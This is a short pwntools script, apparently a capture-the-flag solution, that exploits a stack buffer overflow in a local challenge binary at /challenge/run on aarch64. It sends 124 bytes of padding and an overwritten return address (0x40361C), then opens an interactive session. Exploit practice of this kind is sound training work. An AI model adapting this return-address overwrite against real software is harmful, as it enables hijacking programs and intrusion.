from pwn import *
context.arch="aarch64"

p = process("/challenge/run")
exp= b"A"*124 + 0x40361C.to_bytes(8, "little")

p.send(exp)

p.interactive()